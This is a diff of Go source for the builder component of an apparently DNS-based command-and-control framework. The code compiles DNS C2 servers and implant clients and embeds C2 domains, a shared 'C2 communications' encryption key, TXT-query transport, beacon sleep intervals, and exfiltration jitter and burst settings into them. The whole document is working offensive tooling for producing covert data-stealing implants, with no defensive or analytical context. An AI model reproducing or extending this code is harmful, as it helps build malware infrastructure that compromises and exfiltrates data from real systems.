@@ -83,11 +83,12 @@ func (api *APIServer) handleBuildDNSServer(w http.ResponseWriter, r *http.Reques
 		req.NS2 = "ns2." + req.Domain
 	}
 
-	// Generate encryption key if not provided
+	// Use Master's global encryption key for all C2 communications
+	// This ensures all DNS servers and clients use the same key
+	req.EncryptionKey = api.config.EncryptionKey
 	if req.EncryptionKey == "" {
-		keyBytes := make([]byte, 32)
-		rand.Read(keyBytes)
-		req.EncryptionKey = hex.EncodeToString(keyBytes)[:32]
+		api.sendError(w, http.StatusInternalServerError, "encryption key not configured in Master config")
+		return
 	}
 
 	// Generate API key for this DNS server
@@ -174,7 +175,8 @@ func (api *APIServer) handleBuildClient(w http.ResponseWriter, r *http.Request) 
 	}
 
 	// Build the client
-	binaryPath, err := buildClient(req, api.config.SourceDir)
+	// Build the client with Master's encryption key
+	binaryPath, err := buildClient(req, api.config.SourceDir, api.config.EncryptionKey)
 	if err != nil {
 		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("build failed: %v", err))
 		return
@@ -271,12 +273,33 @@ func (api *APIServer) buildDNSServer(req DNSServerBuildRequest, masterURL, apiKe
 
 	// Copy Server source files to build directory
 	serverSrcDir := filepath.Join(api.config.SourceDir, "Server")
+	fmt.Printf("Debug: Copying Server source from: %s\n", serverSrcDir)
+
+	// Verify source directory exists
+	if _, err := os.Stat(serverSrcDir); os.IsNotExist(err) {
+		return "", fmt.Errorf("server source directory not found: %s\nEnsure 'source_dir' is set correctly in config and files were copied during installation", serverSrcDir)
+	}
+
 	if err := copyDir(serverSrcDir, buildDir); err != nil {
 		return "", fmt.Errorf("failed to copy source: %w", err)
 	}
 
+	fmt.Printf("Debug: Copied to build dir: %s\n", buildDir)
+
 	// Update config.go with embedded configuration
 	configPath := filepath.Join(buildDir, "config.go")
+
+	// Verify config.go exists after copy
+	if _, err := os.Stat(configPath); os.IsNotExist(err) {
+		// List what we have
+		entries, _ := os.ReadDir(buildDir)
+		var files []string
+		for _, e := range entries {
+			files = append(files, e.Name())
+		}
+		return "", fmt.Errorf("config.go not found in build directory after copy\nFiles present: %v\nSource: %s", files, serverSrcDir)
+	}
+
 	config, err := os.ReadFile(configPath)
 	if err != nil {
 		return "", fmt.Errorf("failed to read config: %w", err)
@@ -285,6 +308,11 @@ func (api *APIServer) buildDNSServer(req DNSServerBuildRequest, masterURL, apiKe
 	// Replace embedded config values in tryLoadEmbeddedConfig()
 	// Note: Config uses tab indentation - must match exactly
 	configStr := string(config)
+
+	// Debug: Show what we're looking for and replacing
+	fmt.Printf("Debug: MasterServer before replacement contains empty: %v\n", strings.Contains(configStr, "\t\tMasterServer:   \"\","))
+	fmt.Printf("Debug: Replacing MasterServer with: %s\n", masterURL)
+
 	configStr = strings.Replace(configStr, "\t\tDomain:        \"secwolf.net\",", fmt.Sprintf("\t\tDomain:        \"%s\",", req.Domain), 1)
 	configStr = strings.Replace(configStr, "\t\tNS1:           \"ns1.secwolf.net\",", fmt.Sprintf("\t\tNS1:           \"%s\",", req.NS1), 1)
 	configStr = strings.Replace(configStr, "\t\tNS2:           \"ns2.secwolf.net\",", fmt.Sprintf("\t\tNS2:           \"%s\",", req.NS2), 1)
@@ -297,6 +325,9 @@ func (api *APIServer) buildDNSServer(req DNSServerBuildRequest, masterURL, apiKe
 	configStr = strings.Replace(configStr, "\t\tMasterServer:   \"\",", fmt.Sprintf("\t\tMasterServer:   \"%s\",", masterURL), 1)
 	configStr = strings.Replace(configStr, "\t\tMasterAPIKey:   \"\",", fmt.Sprintf("\t\tMasterAPIKey:   \"%s\",", apiKey), 1)
 	configStr = strings.Replace(configStr, "\t\tMasterServerID: \"dns1\",", fmt.Sprintf("\t\tMasterServerID: \"%s\",", serverID), 1)
+
+	// Debug: Verify MasterServer was set after replacement
+	fmt.Printf("Debug: MasterServer after replacement still empty: %v\n", strings.Contains(configStr, "\t\tMasterServer:   \"\","))
 
 	if err := os.WriteFile(configPath, []byte(configStr), 0644); err != nil {
 		return "", fmt.Errorf("failed to write config: %w", err)
@@ -351,7 +382,7 @@ func (api *APIServer) buildDNSServer(req DNSServerBuildRequest, masterURL, apiKe
 }
 
 // buildClient compiles a client with embedded configuration
-func buildClient(req ClientBuildRequest, sourceRoot string) (string, error) {
+func buildClient(req ClientBuildRequest, sourceRoot, encryptionKey string) (string, error) {
 	// Create temporary directory for build
 	buildDir, err := os.MkdirTemp("", "client-build-*")
 	if err != nil {
@@ -361,18 +392,29 @@ func buildClient(req ClientBuildRequest, sourceRoot string) (string, error) {
 
 	// Copy Client source files
 	clientSrcDir := filepath.Join(sourceRoot, "Client")
+	fmt.Printf("Debug: Copying Client source from: %s\n", clientSrcDir)
+
+	// Verify source directory exists
+	if _, err := os.Stat(clientSrcDir); os.IsNotExist(err) {
+		return "", fmt.Errorf("client source directory not found: %s\nEnsure 'source_dir' is set correctly in config and files were copied during installation", clientSrcDir)
+	}
+
 	if err := copyDir(clientSrcDir, buildDir); err != nil {
 		return "", fmt.Errorf("failed to copy source: %w", err)
 	}
 
-	// Update config.go with DNS domains and timing
-	configPath := filepath.Join(buildDir, "config.go")
-	config, err := os.ReadFile(configPath)
-	if err != nil {
-		return "", fmt.Errorf("failed to read config: %w", err)
-	}
+	fmt.Printf("Debug: Copied to build dir: %s\n", buildDir)
 
-	configStr := string(config)
+	// List files to verify what was copied
+	entries, _ := os.ReadDir(buildDir)
+	fmt.Printf("Debug: Files in build dir: ")
+	for _, e := range entries {
+		fmt.Printf("%s ", e.Name())
+	}
+	fmt.Println()
+
+	// Generate config.go from scratch (don't rely on existing file)
+	configPath := filepath.Join(buildDir, "config.go")
 
 	// Format DNS domains array
 	domainsStr := "[]string{"
@@ -384,21 +426,44 @@ func buildClient(req ClientBuildRequest, sourceRoot string) (string, error) {
 	}
 	domainsStr += "}"
 
-	// Replace values in Client/config.go (embedded variable format)
-	// Note: Client uses tab indentation - must match exactly
-	configStr = strings.Replace(configStr, "\tDNSDomains:          []string{\"secwolf.net\", \"errantshield.com\"},", fmt.Sprintf("\tDNSDomains:          %s,", domainsStr), 1)
-	configStr = strings.Replace(configStr, "\tSleepMin:             60,", fmt.Sprintf("\tSleepMin:             %d,", req.SleepMin), 1)
-	configStr = strings.Replace(configStr, "\tSleepMax:             120,", fmt.Sprintf("\tSleepMax:             %d,", req.SleepMax), 1)
-	configStr = strings.Replace(configStr, "\tExfilJitterMinMs:     10000,", fmt.Sprintf("\tExfilJitterMinMs:     %d,", req.ExfilJitterMinMs), 1)
-	configStr = strings.Replace(configStr, "\tExfilJitterMaxMs:     30000,", fmt.Sprintf("\tExfilJitterMaxMs:     %d,", req.ExfilJitterMaxMs), 1)
-	configStr = strings.Replace(configStr, "\tExfilChunksPerBurst:  5,", fmt.Sprintf("\tExfilChunksPerBurst:  %d,", req.ExfilChunksPerBurst), 1)
-	configStr = strings.Replace(configStr, "\tExfilBurstPauseMs:    120000,", fmt.Sprintf("\tExfilBurstPauseMs:    %d,", req.ExfilBurstPauseMs), 1)
+	// Generate the complete config.go file with Master's encryption key
+	configContent := fmt.Sprintf(`package main
 
-	if err := os.WriteFile(configPath, []byte(configStr), 0644); err != nil {
+// This file is auto-generated at build time by the Master builder
+// DO NOT EDIT MANUALLY
+
+// embeddedConfig contains the configuration embedded at build time
+var embeddedConfig = Config{
+	ServerDomain:         "secwolf.net",
+	DNSDomains:          %s,
+	DomainSelectionMode: "random",
+	DNSServer:            "",
+	QueryType:            "TXT",
+	Encoding:             "aes-gcm-base36",
+	EncryptionKey:        %q,
+	Timeout:              10,
+	MaxCommandLength:     400,
+	RetryAttempts:        3,
+	SleepMin:             %d,
+	SleepMax:             %d,
+	ExfilJitterMinMs:     %d,
+	ExfilJitterMaxMs:     %d,
+	ExfilChunksPerBurst:  %d,
+	ExfilBurstPauseMs:    %d,
+}
+
+// getConfig returns the embedded configuration
+func getConfig() Config {
+	return embeddedConfig
+}
+`, domainsStr, encryptionKey, req.SleepMin, req.SleepMax, req.ExfilJitterMinMs,
+		req.ExfilJitterMaxMs, req.ExfilChunksPerBurst, req.ExfilBurstPauseMs)
+
+	if err := os.WriteFile(configPath, []byte(configContent), 0644); err != nil {
 		return "", fmt.Errorf("failed to write config: %w", err)
 	}
 
-	// Clean and download dependencies
+	fmt.Printf("Debug: Generated config.go with %d DNS domains\n", len(req.DNSDomains)) // Clean and download dependencies
 	modTidyCmd := exec.Command("go", "mod", "tidy")
 	modTidyCmd.Dir = buildDir
 	if output, err := modTidyCmd.CombinedOutput(); err != nil {
